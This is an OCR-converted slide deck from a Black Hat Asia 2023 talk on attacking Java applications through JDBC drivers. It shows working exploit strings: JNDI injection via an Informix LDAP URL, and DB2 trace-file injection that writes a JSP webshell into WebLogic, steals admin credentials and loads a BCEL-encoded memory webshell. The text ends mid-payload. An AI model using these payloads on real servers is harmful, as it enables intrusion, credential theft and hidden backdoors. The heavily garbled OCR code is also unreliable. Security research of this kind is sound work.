---
title: "A new attack interface in Java"
speakers: ["Yuanzhen"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2023"
edition: "ASIA"
year: 2023
source_pdf: "Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf"
pages: 80
sha256: "b4399795a643547329953d519df98715a926199d773d339ecb015bb8323a1903"
text_chars: 73665
ocr_pages: 45
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:59:04Z"
---
# A new attack interface in Java

**Speakers:** Yuanzhen  
**Conference:** Black Hat ASIA 2023  
**Source:** `Black Hat Asia 2023 slides/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf` (80 pages)


## Slide 1

# A New Attack Interface In Java Applications

Xu Yuanzhen

#### Peter Mularien

#BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
pifek hat
ASIA &
MAY 11-12
BRIEFINGS
A New Attack Interface In Java Applications
Xu Yuanzhen
Peter Mularien
#BHASIA @BlackHatEvents
```

## Slide 2

Abused Connection Resource Arbitrary Log File Writing

Lexical Syntax Compatibility

Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 3

Abused Connection Resource Arbitrary Log File Writing Lexical Syntax Compatibility Unchecked Initialization Class

Incorrect Response Disposal

JDBC Attack Protection

## Slide 4

## Leverage JNDI  to Connect JDBC Data Source

JNDI Tree Connection Pool
Data Source Connection
JDBC Driver
Client Data Source Connection Database
Connection
Data Source

## Slide 5

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

SQLH_TYPE=LDAP LDAP_URL=ldap://host-name:port-number LDAP_IFXBASE=Informix-base-DN LDAP_USER=user LDAP_PASSWD=password

JNDI Injection

## Slide 6

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

**JNDI Injection Remote Code  Execution Is NOT Trigged**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
DriverManager.registerDriver (new com.informix.jdbc.IfxDriver
DriverManager.getConnection("jdbc:informix-sqli:informixserver=ser ;user=user ; password=password ; SQLH_TYPE=LDAP
; LDAP_URL=ldap://remote.i1p:389/;LDAP_IFXBASE=Evi LObject"
G JNDI Injection Remote Code Execution Is Trigged
```

## Slide 7

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
try t{
SearchControls constraints = new SearchControls() ;
constraints.setSearchScope (LDAP_SCOPEO) ;
"
String lbase = "cn=" + sname + "," + this. ldap_sqhDn;
NamingEnumeration<SearchResult> results = this.sqhctx.search(lbase,
LDAP_FILTER, constraints) ;
if (results != null && results.hasMore()) 4{
SearchrResult si = (SearchResult) results.next() ;
O CGO N ® OG KR W NY FF
Attributes attrs = si.getAttributes() ;
10 NamingEnumeration<? extends Attribute> ae = attrs.getAlLl();
```

## Slide 8

14 15

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
O CGO N ® WW KL W NY
10
12
13
14
15
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
public NamingEnumeration<SearchResult> search(Name varl, String var2, SearchControls var3)
NamingException
c
PartialCompositeDirContext var4 this;
Hashtable var5 = this.p_getEnvironment() ;
Continuation var6 = new Continuation(varl, vars);
Name var8& = varl;
NamingEnumeration var/;
f
try 4
. L
for(var? = var4.p_search(var8, var2, var3, var6); var6.isContinue(); var7 =
var4.p_search(var8, var2, var3, varé)) {
rc
var8 = var6.getRemainingName () ;
vara
getPCDirContext(var6) ;
thre
OWS
```

## Slide 9

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 protected NamingEnumeration<SearchResult> p_search(Name varl, String var2,
2 SearchControls var3, Continuation var4) throws NamingException {
3 @ HeadTail var5 = this.p_resolveIntermediate(varl, var4);
4 NamingEnumeration var6é = null;
5 switch (var5S.getStatus()) {
6 case 2:
7 var6 = this.c_search(var5.getHead(), var2, var3, var4);
8 break;
9 case 3:
10 var6 = this.c_search_nns(var5.getHead(), var2, var3, var4) ;
11 }
```

## Slide 10

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 HeadTail p_resolveIntermediate(Name varl, Continuation var2) rows NamingException {
2 > var3 1;
3 var2.setSuccess();
4 HeadTail var4 11S.p_parseComponent(varl, var2);
5 Name var5 var4.getTail();
6 Name var6 var4.getHead () ;
7 if (var5 ! ULL && !var5.isEmpty()) {
8 eo) Object var7;
9 if (!var5.get(0).equals("")) {
10 ry {
11 e) var7 \is.c_resolveIntermediate_nns(var6, var2);
12 if (var? != null) {
13 var2.setContinue(var/, var6, iS, var5);
14 } else if (var2.isContinue()) {
15 is. checkAndAdjustRemainingName(var2.getRemainingName () ) ;
16 var2.appendRemainingName(var5) ;
17
18
```

## Slide 11

IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM Informix JDBC Driver Remote Code Execution via JNDI Injection
1 protected Object c_resolveIntermediate_nns(Name varl, Continuation var2) throws NamingException {
2 tr)
3 ) Final Object var3 = this.c_lookup(varl, var2);
4 if (var3 != null && this.getClass().isInstance(var3) )
5 var2.setContinueNNS(var3, varl, this);
6 eturn null;
7 t else if (var3 != null && !(var3 instanceof Context)) {
8 RefAddr var4 new RefAddr ("nns")
9 private static final long serialVersionUID = -8831204798861786362L;
10
ll public Object getContent() {
12 return var3;
13 f
14 15
15 Reference var5 = new Reference("java. lang.Object", varA4) ;
16 CompositeName var6 (CompositeName) varl.clone() ;
17 var6.add("") ;
18 var2.setContinue(var5, var6, this);
19 eturn null;
```

## Slide 12

## IBM Informix JDBC Driver Remote Code Execution via JNDI Injection

- Trigger a JNDI lookup

search
p_search
p_resolveIntermediate
c_lookup
javax.naming.InitialContext#lookup(java.lang.String)
Stack Trace
com.sun.jndi.url.ldap.ldapURLContext#lookup(java.lang.String)
com.sun.jndi.toolkit.url.GenericURLContext#lookup(java.lang.String)
com.sun.jndi.toolkit.ctx.PartialCompositeContext#lookup(javax.naming.Name)
com.sun.jndi.toolkit.ctx.ComponentContext#p_lookup
com.sun.jndi.ldap.LdapCtx#c_lookup

## Slide 13

Abused Connection Resource

### Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class Incorrect Response Disposal

JDBC Attack Protection

## Slide 14

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

- traceFile

   - With the property, the user can specify the name of a file into which the IBM Data Server Driver for JDBC and SQLJ write trace information.

- traceLevel

- traceFileAppend

## Slide 15

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

• Backdoor Webshell in Weblogic Server

JSP Tag

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
* Backdoor Webshell in Weblogic Server
JSP Tag
jdbc:db2://127.0.0.1:5001/test:password=<%Runtime.getRuntime() .exec("open -a
calculator") }3%>;traceLevel=-1;traceFi LeAppend=false; traceFi le=
=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
© Could not establish a connection because of java.lang.IIlegalArgumentException: URLDecoder: Illegal hex characters in escape (%) pattern - For input string: "Ru"<br/>weblogic.jdbc.common. internal. DataSourceUtil.testConnection0(DataSourceUtil.java:426)
<br/>weblogic.jdbc.common.internal. DataSourceUtil.access$000(DataSourceUtil.java:24)<br/>weblogic.jdbc.common. internal. DataSourceUtil$1.run(DataSourceUtil.java:288)<br/>java.security.AccessController.doPrivileged(Native Method)
<br/>weblogic.jdbc.common. internal. DataSourceUtil.testConnection(DataSourceUtil.java:285)<br/>com.bea.console.utils.jdbc.JDBCUtils.testConnection(JDBCUtils.java:928)
<br/>com.bea.console.actions.jdbc.datasources.createjdbcdatasource.CreateJDBCDataSource.testConnectionConfiguration(CreateJDBCDataSource.java:511)<br/>sun.reflect.GeneratedMethodAccessor1084.invoke(Unknown Source)
<br/>sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)<br/>java.lang.reflect.Method.invoke(Method.java:498)<br/>org.apache. beehive.netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870)
<br/>org.apache. beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809)<br/>org.apache.beehive.netui.pageflow.FlowController.internalExecute(FlowController.java:478)
<br/>org.apache. beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306)<br/>org.apache.beehive.netui.pageflow.FlowController.execute(FlowController.java:336)
<br/>org.apache. beehive.netui.pageflow.internal.FlowControllerAction.execute(FlowControllerAction.java:52)<br/>org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431)
<br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor.access$201(PageFlowRequestProcessor.java:97)<br/>org.apache. beehive.netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute(PageFlowRequestProcessor.java:2044)
<br/>org.apache. beehive.netui.pageflow.interceptor.action.internal.ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors.java:64)<br/>...
```

## Slide 16

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

• Backdoor Webshell in Weblogic Server

- Servlet version 2.3 or earlier than 2.3 then EL expression are disabled by default

- Weblogic Server 14c supports the Servlet 4.0

- Use EL expression to evade the URL decoder exception

**<%.getRuntime().exec("open -a calculator")}; %>Runtime ${Runtime.getRuntime().exec("open -a calculator")}**

## Slide 17

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### • Backdoor Webshell in Weblogic Server

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
Backdoor Webshell in Weblogic Server
DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver ()) ;
DriverManager.getConnection("jdbc:db2://127.0.0.1:5001/test: password=${pageContext.setAttribute("classLoader"
, hread.currentThread() .getContextClassLoader ()) ;pageContext.setAttribute("httpDataTransferHandler" , pageConte
xt.getAttribute("classLoader").loadClass("weblogic.deploy.service.datatransferhandlers.HttpDataTransferHandle
r")) ;pageContext.setAttribute("managementService",
pageContext.getAttribute("classLoader") . LoadClass("weblogic.management. provider .ManagementService") ) ;pageCont
ext.setAttribute("authenticatedSubject",pageContext.getAttribute("classLoader") .loadClass("weblogic.security.
acl.internal.AuthenticatedSubject") ) ;pageContext.setAttribute("propertyService", pageContext. getAttribute ("cla
ssLoader") . loadClass ("web logic.management.provider.PropertyService") ) ;pageContext.setAttribute("KERNE_ID", pag
eContext.getAttribute("httpDataTransferHandler") .getDeclaredField("KERNE_ID") ) ;pageContext. getAttribute ("KERN
E_ID").setAccessible(true) ;pageContext.setAttribute("getPropertyService",managementService. getMethod("getProp
ertyService", pageContext. getAttribute("authenticatedSubject"))) ;pageContext.getAttribute("getPropertyService"
).setAccessible(true) ;pageContext.setAttribute("prop", pageContext.getAttribute("getPropertyService") .invoke(n
ULL, pageContext. getAttribute("KERNE_ID").get((null)))) ;pageContext.setAttribute("getTimestamp1",propertyServi
ce.getMethod("getTimestamp1") ) ;pageContext.getAttribute("getTimestamp1") .setAccessible(true) ;pageContext.setA
ttribute("getTimestamp2",propertyService.getMethod("getTimestamp2") ) ;pageContext. getAttribute("getTimestamp2"
).setAccessible(true) ;pageContext.setAttribute("username",
pageContext.getAttribute("getTimestamp1") .invoke(pageContext.getAttribute("prop"))) ;pageContext.setAttri bute (
"password", pageContext.getAttribute("getTimestamp2") . invoke (pageContext.getAttribute("prop"))) ;pageContext.ge
tAttribute ("username") .concat("/") .concat (pageContext. getAttri bute ("password") ) };traceFi LleAppend=false;traceL
evel=-1;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;
mW).
a)
```

## Slide 18

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### • Backdoor Webshell in Weblogic Server

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
IBM DB2 JCC Driver Remote Code Execution via Logger Injection
¢ Backdoor Webshell in Weblogic Server
Cc i) 127.0.0.1
user.dir=/Users/pyn3rd/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain, line.separator=\n, java.vm.name=Java HotSpot(TM) 64-Bit Server VM,
javax.management.builder.initial=weblogic.management.jmx.mbeanserver.WLSMBeanServerBuilder, file.encoding=UTF-8, org.omg.CORBA.ORBClass=weblogic.corba.orb.ORB, java.specification.version=1 .8, launch.use.env.classpath=true } [ibm][db2]
[jcc] Dumping all file properties: { } [ibm][db2][jec] END TRACE_DRIVER_CONFIGURATION [ibm][db2][jec] BEGIN TRACE_CONNECTS [ibm][db2][jcc] Attempting connection to 127.0.0.1:5001/test [ibm][db2][jcc] Using properties: {
traceLevel=-1, traceFile=.././../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell jsp, User=db2, passwOrd=***** HERA A AAA AAA AAA AAA AAA AAA AAA AAA AAAS ASA SSA SASS SSS SSS SESS SESS SESS SESS SESS SESS SESE EEE,
url=jdbc:db2://127.0.0.1:5001/test:password=weblogic/pynerd@ 123 ;traceFileAppend=true;traceLevel=- | ;traceFile=../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp;,
pageContext.setAttribute("httpDataTransferHandler" pageContext.getAttribute("classLoader").loadClass("weblogic.deploy.service datatransferhandlers.HttpDataTransferHandler"));pageContext.setAttribute("managementService",
pageContext.getAttribute("classLoader").loadClass("weblogic.management.provider.ManagementService" ));pageContext.setAttribute("authenticatedSubject" pageContext.getAttribute("classLoader").loadClass("weblogic.security.acl.internal.AuthenticatedSu
pageContext.getAttribute("getTimestamp1").invoke(pageContext.getAttribute("prop")));:pageContext.setAttribute("password" pageContext.getAttribute("getTimestamp2").invoke(pageContext.getAttribute(""prop"))):pageContext.getAttribute("username").con
username=db2 } [ibm][db2][jcc] END TRACE_CONNECTS [ibm][db2][jcc] BEGIN TRACE_DIAGNOSTICS [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036]
java.sql.SQLException [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@5bdb 1036] SQL state = null [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue:
‘weblogic.kernel.Default (self-tuning)'][SQLException @ Sbdb 1036] Error code = -99999 [ibm][db2][jcc][Thread:[ ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)'][SQLException@ 5bdb 1036] Message = [ibm][db2][jcc]
[10333][11649] No license was found. An appropriate license file db2jcc_license_*.jar must be provided in the CLASSPATH setting. [ibm][db2][jcc][Thread:[ACTIVE] ExecuteThread: '11' for queue: 'weblogic.kernel.Default (self-tuning)']
[SQLException @5bdb1036] Stack trace follows com.ibm.db2.jcc.c.SqlException: [ibm][db2][jcc][10333][ 11649] No license was found. An appropriate license file db2jcc_license_*.jar must be provided in the CLASSPATH setting. at
com.ibm.db2.jcc.c.o.d(0.java:534) at com.ibm.db2.jcc.c.p.a(p.java:332) at com.ibm.db2.jcc.c.p.(p.java:404) at com.ibm.db2.jcc.b.b.(b.java:256) at com.ibm.db2.jcc. DB2Driver.connect(DB2Driver.java: 163) at
weblogic.jdbc.common.internal.DataSourceUtil.testConnection0(DataSourceUtil .java:373) at weblogic.jdbc.common.internal.DataSourceUtil .access$000(DataSourceUtil .java:24) at
weblogic.jdbc.common. internal .DataSourceUtil$1 .run(DataSourceUtil.java:287) at java.security. AccessController.doPrivileged(Native Method) at weblogic.jdbc.common.internal.DataSourceUtil testConnection(DataSourceUtil java:284) at
com.bea.console.utils jdbc JDBCUtils.testConnection(JDBCUtils.java: 1011) at com.bea.console.actions.jdbc datasources .createjdbcdatasource .CreateJDBCDataSource.testConnectionConfiguration(CreateJDBCDataSource.java:524) at
sun.reflect.GeneratedMethodAccessor803 .invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpI.java:43) at java.lang.reflect. Method .invoke(Method.java:497) at
org.apache.bechive .netui.pageflow.FlowController.invokeActionMethod(FlowController.java:870) at org.apache.beehive.netui.pageflow.FlowController.getActionMethodForward(FlowController.java:809) at
org.apache.bechive .netui.pageflow.FlowController.internalExecute(FlowController.java:478) at org.apache.beehive.netui.pageflow.PageFlowController.internalExecute(PageFlowController.java:306) at
org.apache.bechive .netui.pageflow.FlowController.execute(FlowController.java:336) at org.apache.beehive.netui.pageflow.internal FlowControllerAction.execute(FlowControllerAction.java:52) at
org.apache.struts.action.RequestProcessor.processActionPerform(RequestProcessor.java:431) at org.apache.beehive.netui.pageflow.PageFlowRequestProcessor.access$20 | (PageFlowRequestProcessor.java:97) at
org.apache.beehive .netui.pageflow.PageFlowRequestProcessor$ActionRunner.execute(PageFlowRequestProcessor.java:2044) at
org.apache.beehive .netui.pageflow.interceptor.action internal ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors.java:64) at
org.apache.bechive .netui.pageflow.interceptor.action.ActionInterceptor.wrapAction(ActionInterceptor.java: 184) at
org.apache.beehive .netui.pageflow.interceptor.action internal .ActionInterceptors$WrapActionInterceptorChain.invoke(ActionInterceptors.java:50) at
org.apache.beehive .netui.pageflow.interceptor.action internal .ActionInterceptors$WrapActionInterceptorChain.continueChain(ActionInterceptors .java:58) at
org.apache.bechive .netui.pageflow.interceptor.action internal .ActionInterceptors.wrapAction(ActionInterceptors.java:87) at org.apache.beehive.netui.pageflow.PageFlowRequestProcessor.processActionPerform(PageFlowRequestProcessor.java:2116) at
com.bea.console.internal.ConsolePageFlowRequestProcessor.processActionPerform(ConsolePageFlowRequestProcessor.java:275) at org.apache.struts.action.RequestProcessor.process(RequestProcessor.java:237) at
org.apache.bechive .netui.pageflow.PageFlowRequestProcessor.processInternal(PageFlowRequestProcessor.java:556) at org .apache.bechive.netui.pageflow.PageFlowRequestProcessor.process(PageFlowRequestProcessor.java:853) at
org.apache.bechive .netui.pageflow.AutoRegisterActionServlet.process(AutoRegisterActionServlet.java:631) at org.apache.bechive.netui.pageflow.PageFlowActionServlet.process(PageFlowActionServlet.java: 158) at
com.bea.console.internal.ConsoleActionServlet.process(ConsoleActionServlet.java:266) at org.apache.struts.action.ActionServlet.doGet(ActionServlet.java:416) at com.bea.console.internal.ConsoleActionServlet.doGet(ConsoleActionServlet.java:135) at
org .apache. beehive netui.pageflow.PageFlowUtils.strutsLookup(PageFlowUtils.java: 1199) at org .apache.bechive .netui.pageflow.PageFlowUtils.strutsLookup(PageFlow Utils .java:1129) at
```

## Slide 19

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

#### How to Inject an Indiscoverable Memory Webshell into Weblogic Server?

## Slide 20

## IBM DB2 JCC Driver Remote Code Execution via Logger Injection

###### **Acquire Weblogic Server request object with current thread**

**Utilize malicious class to implement new filter register**

**inject  bytecode of malicious class with BCEL**

## Slide 21

**BCEL Code Transformer**

###### **WeblogicMemFilter**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ylLic cla BCELTransfer {
blic static void main(String[] args) throws Exception{
JavaClass cls = Repository. LoGHsujae Lass (hele Lees Tiel tenmiF | Cis? ass);
String code = Utility.encode(cls.getBytes(), true); [_BCEL Code Transformer )
Class<?> aClass = new ClassLoader ().loadClass("S$$BCEL$$"+code) ;
System. out.println("$$BCEL$S"+code) .
aClass.newInstance() ;
; WeblogicMemFilter {
atic {
String filterName = "dynamicFilter1";
String urlPattern nx":
String FILTER_CLASS_STRING = <STRINGS>;
Thread thread = Thread.currentThread() ;
Field workEntry
thread. getContextClassLoader () . loadClass("weblogic.work.ExecuteThread") .getDeclaredField("
workEntry.setAccessible(true) ;
Object workentry = workEntry.get(thread) ;
workEntry") ;
WeblogicMem Filter
Field connectionHandler = Berens gasolelsel0 ). getDeclaredField("connectionHandler") ;
connectionHandler.setAccessible(true) ;
Object http = connect ionHandler .get(.
Field requestl http.getClass() .getDeclaredField ("request") ;
requestl.setAccessible(true) ;
Object servletRequest requestl.get(http) ;
Field context serv lLetRequest. getClass() .getDeclaredField("context")
context.setAccessible(true) ;
Object webAppServletContext context. Esarel Stee [eteliteie(Utsisic)
Field contextField = crea elem getClass () _getDeclaredField( "f4lterManager") ;
contextField.setAccessible(true) ;
Object filterManager = contextrield. get (webAppServletcontext)
```

## Slide 22

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DriverManager.registerDriver (new com.ibm.db2.jcc.DB2Driver()) ;
DriverManager . getConnection("
jdbc:db2://127.0.0.1:5001/test: password=${''.getClass() .forName('com.sun.org.apache.bcel.internal.util.ClassLoader') .newInstance() . loadClass('$$BCELS$SLS8b$ISASASASASASASASadX$8b$ 7b$5b$e7Y$7 FOSy$5b$
b2So0$c7$b6b$3bQ$9b$a6M$b7n$89$j $d7$b2$S$c7$b1$93$5e$be$a3$bb$z$c9$91d$5d$b3$d0$j$j$jKS8asS8Ff$s$s95$8enFfSbO$c1$$$94S$db$6OSboOQsc6m1$bOF$40S$c7$d2$Bn$e9hW6HS$alt lLcOSae$7 FSIScfSD$cf$c2$ef$3bGr$7ck$5b$k$90$a
dsSbe$ f3Sde$bes f7$ae$ F3$7e0$ fdS$e8$d5$d7$89$e8S0$ Fd$87$95$y$ F4$I$x$7d$92$3eSc5$_S$3fcSab$e7$acd$e2$Q$T$fdSyS$c7$ fdS9cs$99$7eSdeBSbf$60$a6_4$93wS98S3eMSbfd$r$x$ fd$b2$99$3esSc3Sefsbfb$a5_Sa5$cfZSBSfesi_$fd
$g$87$3do$al_$b7$d0$e7$z$ F4ShSws fam$x$ FdSws fdSb6$85T $8e$ F8$j $x$7d$81$T$7 F$81$7eSd7BSVSL$7d$d1Bu$L5$z$ F4$r3$ fd$9e$99$ 7eSdFfL_S$b6S92$8b$5eSe0$b4$b7$y$d41$d3wsact$96$ fe$80_$ feSdOB$7 fdSal$SN$L$bd$c8$95$fa
$aa$95$k$a5$3Ff$e6$ fOSaf$99$e9$b6$99$5e$Sh$esj Sa9R$d2$9eSUhSeOSecSb9Sa4S40Ssw5Saf$l4$gSwUS94H$b3$9cS$easSebRN$FSc4$k$aa$ca$92$9a$94$ea$rs feSdcS$D$9aSb4bS$a9Sn$d0S5cHSaes96$e7$94S8eT S$aesa9$cas$dc$cd$7cN$9
e$934M$927S$e7$ F29$d7$5cI$c9$a9$d5BI$O$xe_1$d5$94$ faSVS81$y$FEsSabRS$D$cc$8 f$9dSN$dd$94ZSd2$9cSwUSKsqSad$5eSaa$US$ aeS9cS$db$FSd2$c9$cOrD$e9S It fS$XSoRS8d7Se5bxX$d1$8a$d5$bc$b7$p$x5$adT$ad$80px$e6$i$sEsj$f6
$83$b2a$b2Z$95$ f2I$5d$a0$T$ fb$b7$I$e9S1$90$8c$e4$a4$86r$e9sa2G$91$ab$3a$e5$c9P$a3VS$99Sx$97S gS F2$9c$c8$e2S$de$ j SMHSHSS5AMS81Sj GSaeS8bSQS5dSd6Sd5$R$e8$81$5d$a2$eb$cas$s6$aas$c8$das$9c$al$wx $Gduk$ad$ f1C$8c
$9cS$daSeb$e5n$ad$ef$e9$89$ fd$c4w$a7$9 f$e4z$cé6$b9$9b$c3RMS$t$d3$d3$el$ebHE3$ fd$89$9ex$9FS$R$c8Sba$e3$9a$86$99$ fe$d4L$7 fF$a6m3Sbd$M7S$c5K$85$8a$a45$eb$90$ 7es fF6$bd$c4$cOSd8$d1VS$aas$b4$aa$9bI$b8g$e7$e5$dd$9
ck$b9$9bSb0$ F3Sca$3b$cb$ea$R$c1$L$d5$dc$cd$bdSRS$daAYSN7F$a42$94ShD$3c$b7$e0$_$cbUYSed$e5$aalS$ca5xX$bf$al$e7S$d35$qS9bRSaf$I$ql$1$e48$c4$ fisbes92$a2r$bfS9b$cbR$ad$G$ 7dSmSab$yi$c8$j $IBS86$eaI$a3$a9j$eo
S$$Se1Sh$E$40$xS$d6SVSvS$b fwSb5u$j $c6$b3$ab$5d$adoz$xZ$bd$db$5b$x$c6z$5cS$aev$wSd8$M$8eSOH$95$bc$ca$b3$c61$d44$ec$60$a9$x$c f6$95$866$_SdOSb1$86Ro$a9$8aSw3$mP$IL$9a$d2$cl1j$a2$ad$e4x$ad$w7$I$dc$7dSbo$adG$s
a0$Sdb$bOcrx$aaH$F $be$c5D$5d$v$94Sg$80$yY$a5$d5$P$cb$d4$k$c f$84$40$d1$e3$1$3 F$80SQhSd2$bOS$b3$a9$95$d49VSafKS5dSO$Se6QOhS8d$uxS$9buu$c7$d1$c7$7d$c1$d0$ba7$ fF6$8cS$3b$c4$e2$ figSe2$eb$b1s60Sc4oSa6wsccs$ F4$e7$
e8ZhS$3 FhS$Sed0$88ws9buY$81bS60S9FS3aSdO$F$k$e7S9b$daSe8$C$5d$E$a7$8d$5e$a50$d8$e8$_$e85$90$k$5ej 6z$9d$bei $a3ezC$a0$b1$ Fd9$Sp$do0$d1$bc$b2$81$9eSd5k$wS$a3$ for$d7L$7 Fi Sa30Q$dOF$df$ab6$bf$Sse8$elw$e9$o06$ fak
ZSDEd$a3$3b$ f4$a6$8d$ fe$s6s feSd6Fosd1$df$d9se8m$ce$s7d$y$dfSadh$e5$921$d8$81Sa8$kS99S9bSwSac$_vS5b$97S$$b5SK$8c10$94I S$acS$casbcm$b6$mSb6$d9$r 7c$8b$ee6s30$3b$cO$3cN$7c$_$G$99$e7r$90ySd9SwcSISwS8dVSo9sy
SVvSdd$ee$82$e8aSde$e8$ws$ f3$sx$acPeSd1$b6$Yp$b7E$dOm$82$$$c3$e2S$80$c5$dbb$Y$bOSI$ f3$5esmOSefS$e5$A$ f31$7c$bd$o$ FO$97$a5$d4B$z$efSb9$88usb8$bas9a$cc$ed$k$ F3S$e4$5c1$95ESd9$b5usSbf$das$cc$s$wSebs$a9$VUVCSc
5LS$b9$c3S$e1$flusff$d2$cdL$aas$93$casa4wj $99$d4I$p$obSdc$cly$f3$ febMn$7bYhSb3$d3$cc$abSa3$ad$5c$wSa9$c9$ae$a2$9a$ F3Sb7S5bSb9$ F2$d2VSeeBSb2$9bq$rZ$d9$b2$da$c8$ fo$93$dd$dO$85$98Sw_$88Sb6$92$ feSe4V$des9b
Sad$e5$Cx$be$d9Se0z$d4re$d5$IS99ShS$ab$de$ces$b3$99t$b6$a8Sb8$97Sb6$b2Se9SVwSces9ft$sEs9cs$3ds$das$cd$1$e4 Fk$Sd9SadF$zY$ FO2$8Ff$7 F$1$ i $baSESdeSh$bf$c8D1$92MSc7S$aaSbO$3 fSk$db$8asd0$dd$I$ faSz$e8$Q$scc$ fas97$F
cRS$aa$83$e7$a0$c8$7c$8dSea$baSbfV$cc$97$7d$XCS$xS$oSaa$5c$c96Sb8$ad$IW$b2$9b$87$1$ F2$3e$ F8SxS9d$e4v$z$besxSdd$F$b1$95S$abD$d45$e7$3b$eax$cd$a4$d4Se6ZwMqslg$ fd$3eg$s$eaeL$d5$dcx$wesq$85$b7$c7$Lru$8a$b9$
b2SdcJISEVZ$ZWrkKSe6vSblHSp$9b$e21$ fF6$ad$80$ 7eM$3e$a8$tl_SIKes$9FfSx$93$$$b4v$ FOSeesa5$ F5$be$$$89r$b2$930SnF$kS$$S$ef$9es8e$800$c9$ fe$a5$ab6S$ecI$40$c6$d2$bb$c9$e8$d3$SBS8FPS$3 FSH$a2$aebQS$e2$ fa$89$daa$ fc$3d$
bfSafxSqSbfSaf$96Sd3s$p$d2$cd$ab6$91$bf$ees fcas f4$d5$7cSmSd6SO9S8b$ce$/c$40$bc$8Ff$fes f3seby$bfSefSa6Se4$9c$_Sca$3eSpwy$cdA$a7$d5xXS$bax3$9b$Sws9dRSkzS$b6es$96$uSeOS8b$ i $S$5d$3cOc$dd$dc$85M$ fO$d7$d6$8d$3cN
r$dd$ f4Z$d9$93SbfSa5$FS3dSW$k$c6$92LDM$b9$93$HcS$eb$e2$ faSb1V$3c$Qs$ca$be$7en$c4$e2$d9$b4o0$3es$9b$8es FOSbc$ F7d$5c$ F3S9bSk$s$s$98S8F$ Fb$b6Exx$7cS$9d$x$ F3Sd0aS$c FKQSdcK$D$7dQ$d FS$V$c8ZSISb9IVj $b9S$d2R$v$93$8
eSadlOwSuSsVSOs$d1$c9B$9b$rS$dbP$b2$zf$b1$97$84$dcFoh$s87s99ScFfSc9Sd2ScOESkS$ySF$dc$Gp$F$e6$ f7$ea$3c$Z$ F8SqSd3n$b3$y$TSel7$b1SMS3b$8b$cc$_S$c3$ce$FfFfC$cd$a3v$bdz$adxS5b9$bf$af$99$ed$$$5d$cb$e0$cd0Sa3sSe7F$
ec$fe$b5$c1$f9$5c$G$9F$94$baSdc$8a$t$96$7c$8as L$ fe$M$a0$7 F$b8xN$z$i $e4S9dsdf$ f1i$ F7$5eZ$d6Sa9SASb6Sab$ F6Se1SwSa6wseb$3bz$ad$e7$D$ FOeY$5eS5cMt$O$ f5$ F7S$g5 F2Sc5wSwSe6$eeScb$a7$ f7Y$d8$ees f7u$ F3$a8$5d_$bc
